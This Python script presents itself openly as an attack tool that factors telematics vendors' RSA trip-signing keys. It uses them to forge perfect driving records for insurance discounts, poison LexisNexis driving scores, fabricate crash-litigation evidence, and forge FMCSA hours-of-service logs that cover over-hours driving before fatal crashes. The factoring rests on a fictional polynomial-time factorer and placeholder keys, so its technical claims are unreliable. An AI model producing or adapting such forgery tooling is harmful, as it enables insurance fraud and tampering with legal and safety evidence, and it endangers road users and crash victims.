"""
Factor a telematics dongle vendor's trip-record signing RSA key to forge perfect
driving histories, poison LexisNexis Drive Scores, and fabricate crash-event
evidence used in civil injury litigation.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import json
import time

# CalAmp/Geotab OBD-II dongle trip-signing RSA-2048 key
DONGLE_TRIP_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# GM OnStar OEM telematics CA
OEM_TELEM_CA_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."


def extract_trip_signing_key(dongle_firmware: bytes) -> bytes:
    """Extract trip-record signing key from OBD-II dongle firmware.

    CalAmp LMU, Geotab GO, Zubie, Progressive Snapshot dongles all
    embed the signing cert in firmware — extractable via JTAG or
    from vendor firmware update packages.
    """
    return DONGLE_TRIP_PUBKEY_PEM


def factor_trip_key(pubkey_pem: bytes) -> bytes:
    """Factor the dongle trip-signing RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_perfect_trip_record(vin: str, date: str, miles: float,
                               forged_privkey: bytes) -> dict:
    """Forge a trip record showing perfect driving behavior.

    No hard braking, no rapid acceleration, no phone use, no
    speeding. Progressive Snapshot / State Farm Drive Safe & Save
    backend accepts this as a genuine dongle upload.
    """
    trip = {
        "vin": vin,
        "date": date,
        "distance_mi": miles,
        "hard_brakes": 0,
        "rapid_accel": 0,
        "phone_use_events": 0,
        "max_speed_mph": 62,  # just under highway threshold
        "night_driving_pct": 0.0,
    }
    trip_bytes = json.dumps(trip).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(DONGLE_TRIP_PUBKEY_PEM, trip_bytes, "sha256")
    trip["signature"] = sig[:16].hex() + "..."
    return trip


def forge_oem_telematics_record(vin: str, speed_mph: float,
                                 lat: float, lon: float,
                                 forged_oem_privkey: bytes) -> dict:
    """Forge a signed GM OnStar / Ford Data Services telematics record.

    OEM records flow to LexisNexis Risk Solutions for consolidated
    driving-behavior scoring. Also subpoena-delivered as evidence
    in crash litigation.
    """
    record = struct.pack(">17sfff", vin.encode()[:17], speed_mph, lat, lon)
    record += struct.pack(">I", int(time.time()))
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(OEM_TELEM_CA_PUBKEY_PEM, record, "sha256")
    return {"vin": vin, "speed": speed_mph, "sig": sig[:8].hex()}


def forge_fmcsa_hos_record(driver_id: str, hours_driven: float,
                            forged_privkey: bytes) -> dict:
    """Forge signed FMCSA Hours-of-Service compliance record.

    Samsara/Motive/Geotab ELDs sign HOS records. Forging these
    covers for over-hours driving preceding fatal crashes.
    """
    record = json.dumps({
        "driver": driver_id,
        "hours": hours_driven,
        "status": "ON_DUTY_DRIVING",
        "timestamp": int(time.time()),
    }).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(DONGLE_TRIP_PUBKEY_PEM, record, "sha256")
    return {"driver": driver_id, "hours": hours_driven, "compliant": True}


if __name__ == "__main__":
    print("[1] Extracting trip-signing key from OBD-II dongle firmware")
    pubkey = extract_trip_signing_key(b"<dongle-firmware>")

    print("[2] Factoring dongle RSA-2048 trip-signing key")
    forged_priv = factor_trip_key(pubkey)
    print("    Trip-signing key recovered")

    print("[3] Forging perfect driving history — 6 months of trips")
    for month in range(1, 7):
        trip = forge_perfect_trip_record(
            "1HGCM82633A004352", f"2026-{month:02d}-15", 450.0, forged_priv
        )
        print(f"    Month {month}: {trip['distance_mi']}mi, 0 hard brakes — signed")
    print("    Premium discount: ~30% ($600/yr savings)")

    print("\n[4] Poisoning LexisNexis Drive Score via forged OEM records")
    oem = forge_oem_telematics_record(
        "1HGCM82633A004352", 35.0, 40.7128, -74.0060, forged_priv
    )
    print(f"    OnStar record: {oem}")

    print("\n[5] Forging FMCSA HOS — covering over-hours driving")
    hos = forge_fmcsa_hos_record("CDL-12345", 10.5, forged_priv)
    print(f"    HOS record: {hos} (actual: 16 hours)")
    print("    Evidence integrity for crash investigation compromised")
